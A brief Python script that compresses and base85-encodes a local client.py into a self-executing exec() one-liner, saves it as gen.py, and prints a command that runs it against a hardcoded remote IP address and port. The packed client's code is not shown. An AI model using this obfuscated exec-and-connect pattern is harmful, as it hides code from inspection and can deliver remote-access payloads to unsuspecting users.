import shlex, zlib, base64

cp = base64.b85encode(zlib.compress(open("./client.py", "rb").read())).decode()
code = f"import zlib, base64; exec(zlib.decompress(base64.b85decode('{cp}')))"

open("./gen.py", "w").write(code)
print(f"python3 -c {shlex.quote(code)} 149.104.25.181 23333")
